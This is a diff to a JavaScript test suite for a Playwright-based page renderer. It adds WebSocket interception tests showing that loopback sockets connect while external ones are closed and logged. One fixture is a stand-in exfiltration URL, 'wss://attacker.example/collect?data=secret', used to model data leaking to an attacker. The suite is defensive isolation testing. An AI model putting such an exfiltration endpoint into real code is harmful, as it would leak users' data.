@@ -64,22 +64,28 @@ function makeFakePage(frame = {}, { landUrl, url } = {}) {
 
 // The real implementation installs interception at context scope and listens
 // for context 'page' events, so the fake context mirrors context.route,
-// context.on('page'), and context.newPage (handing out the injected pages in
-// order — useful for faking a popup page beyond the entry page).
+// context.routeWebSocket, context.on('page'), and context.newPage (handing out
+// the injected pages in order — useful for faking a popup page beyond the entry
+// page).
 function makeFakeContext({ page, pages } = {}) {
   const queue = pages ? [...pages] : [];
   const routes = [];
+  const webSocketRoutes = [];
   const pageHandlers = [];
   const created = [];
   return {
     _opts: undefined,
     _routes: routes,
+    _webSocketRoutes: webSocketRoutes,
     _pageHandlers: pageHandlers,
     _created: created,
     _closed: false,
     _initScripts: [],
     async route(pattern, handler) {
       routes.push({ pattern, handler });
+    },
+    async routeWebSocket(pattern, handler) {
+      webSocketRoutes.push({ pattern, handler });
     },
     async addInitScript(fn) {
       this._initScripts.push(fn);
@@ -142,9 +148,23 @@ function makeRoute() {
   };
 }
 
+function makeWebSocket(url) {
+  return {
+    url: () => url,
+    connected: 0,
+    closed: 0,
+    connectToServer() {
+      this.connected++;
+    },
+    async close() {
+      this.closed++;
+    },
+  };
+}
+
 // Run renderPage against fakes and return the installed context-scope route
-// handler + the page/context/browser/log so tests can dispatch synthetic
-// requests at the handler and emit popup 'page' events.
+// handlers + the page/context/browser/log so tests can dispatch synthetic
+// requests at the handlers and emit popup 'page' events.
 async function runFakes({ url = 'http://127.0.0.1:1/', vendor, vendorDir, gotoThrows, log, landUrl, pages } = {}) {
   const frame = {};
   const page = makeFakePage(frame, { landUrl });
@@ -164,6 +184,7 @@ async function runFakes({ url = 'http://127.0.0.1:1/', vendor, vendorDir, gotoTh
     render,
     context: browser._contexts[0],
     handler: browser._contexts[0]._routes[0].handler,
+    webSocketHandler: browser._contexts[0]._webSocketRoutes[0].handler,
   };
 }
 
@@ -624,6 +645,33 @@ describe('renderPage with faked page/routing', () => {
     assert.deepEqual(render.result.aborted, []);
   });
 
+  test('loopback WebSockets connect through interception without abort records', async () => {
+    const { webSocketHandler, render } = await runFakes({});
+    const webSocket = makeWebSocket('ws://127.0.0.1:8080/feed');
+    await webSocketHandler(webSocket);
+    assert.equal(webSocket.connected, 1);
+    assert.equal(webSocket.closed, 0);
+    assert.deepEqual(render.result.aborted, []);
+    assert.deepEqual(render.result.defects, []);
+  });
+
+  test('external WebSockets are closed and recorded in both abort and defect logs', async () => {
+    const { webSocketHandler, render, log } = await runFakes({});
+    const webSocket = makeWebSocket('wss://attacker.example/collect?data=secret');
+    await webSocketHandler(webSocket);
+    assert.equal(webSocket.connected, 0);
+    assert.equal(webSocket.closed, 1);
+    const rec = {
+      url: 'wss://attacker.example/collect?data=secret',
+      resourceType: 'websocket',
+      method: 'GET',
+      reason: 'external',
+    };
+    assert.deepEqual(render.result.aborted, [rec]);
+    assert.deepEqual(render.result.defects, [rec]);
+    assert.ok(log.lines.some((l) => l.includes(`abort websocket ${rec.url} (external)`)));
+  });
+
   test("an external FONT sub-resource is aborted and recorded with resourceType 'font' (the fatality seam)", async () => {
     // A CSS @font-face sub-resource is not DOM-declared, so the record here —
     // reason 'external', resourceType 'font', the exact URL — is the ONLY
@@ -1059,6 +1107,31 @@ try {
 const LIVE_ENDPOINT = process.env.NOISE_BROWSER_WS || '';
 const canRunLive = Boolean(liveClient && LIVE_ENDPOINT);
 
+function startWebSocketServer() {
+  const sockets = new Set();
+  const server = createServer((req, res) => {
+    res.setHeader('content-type', 'text/html');
+    res.end('<!doctype html><meta charset="utf-8"><title>websocket-isolation</title>');
+  });
+  server.upgrades = 0;
+  server.sockets = sockets;
+  server.on('upgrade', (req, socket) => {
+    server.upgrades++;
+    sockets.add(socket);
+    socket.on('close', () => sockets.delete(socket));
+    const accept = createHash('sha1')
+      .update(`${req.headers['sec-websocket-key']}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`)
+      .digest('base64');
+    socket.write(
+      'HTTP/1.1 101 Switching Protocols\r\n' +
+        'Upgrade: websocket\r\n' +
+        'Connection: Upgrade\r\n' +
+        `Sec-WebSocket-Accept: ${accept}\r\n\r\n`,
+    );
+  });
+  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(server)));
+}
+
 // A tiny loopback redirector: each /r-* endpoint 302s to a target that changes
 // the path, query, or origin relative to the entry URL — reproducing an
 // observed escape (httpbin.org/redirect-to) without leaving the host.
@@ -1109,6 +1182,60 @@ describe(
   'integration: live service endpoint (network isolation, vendoring, abort log)',
   { skip: !canRunLive ? 'needs resolvable playwright + NOISE_BROWSER_WS' : false },
   () => {
+    test('real WebSockets allow loopback but block and record external reaches', { timeout: 15000 }, async () => {
+      const { browser } = await resolveBrowser({
+        env: { ...process.env, NOISE_BROWSER_WS: LIVE_ENDPOINT },
+        client: liveClient,
+        clientVersion: liveVersion,
+      });
+      const server = await startWebSocketServer();
+      const { port } = server.address();
+      const externalUrl = 'ws://192.0.2.1:9/collect';
+      const log = sink();
+      let render;
+      try {
+        const r = await renderPage({ browser, url: `http://127.0.0.1:${port}/index.html`, log });
+        render = r;
+        const states = await r.page.evaluate(
+          async ({ loopbackUrl, externalUrl }) => {
+            const connect = (url) =>
+              new Promise((resolve) => {
+                const socket = new WebSocket(url);
+                const timer = setTimeout(() => {
+                  socket.close();
+                  resolve('timeout');
+                }, 3000);
+                const done = (state) => {
+                  clearTimeout(timer);
+                  resolve(state);
+                };
+                socket.onopen = () => {
+                  socket.close();
+                  done('open');
+                };
+                socket.onerror = () => done('error');
+                socket.onclose = () => done('closed');
+              });
+            return { loopback: await connect(loopbackUrl), external: await connect(externalUrl) };
+          },
+          { loopbackUrl: `ws://127.0.0.1:${port}/feed`, externalUrl },
+        );
+        assert.equal(states.loopback, 'open');
+        assert.ok(states.external === 'error' || states.external === 'closed', `external socket state: ${states.external}`);
+        assert.equal(server.upgrades, 1, 'only the loopback WebSocket reached the local server');
+        const rec = { url: externalUrl, resourceType: 'websocket', method: 'GET', reason: 'external' };
+        assert.deepEqual(r.result.aborted, [rec]);
+        assert.deepEqual(r.result.defects, [rec]);
+        assert.ok(log.lines.some((l) => l.includes(`abort websocket ${externalUrl} (external)`)));
+        await r.context.close();
+      } finally {
+        if (render) await render.context.close().catch(() => {});
+        for (const socket of server.sockets) socket.destroy();
+        await new Promise((resolve) => server.close(resolve));
+        await browser.close();
+      }
+    });
+
     test('a real page runs under the FR-9 policy: vendored script executes, external is aborted', async () => {
       const { browser } = await resolveBrowser({
         env: { ...process.env, NOISE_BROWSER_WS: LIVE_ENDPOINT },
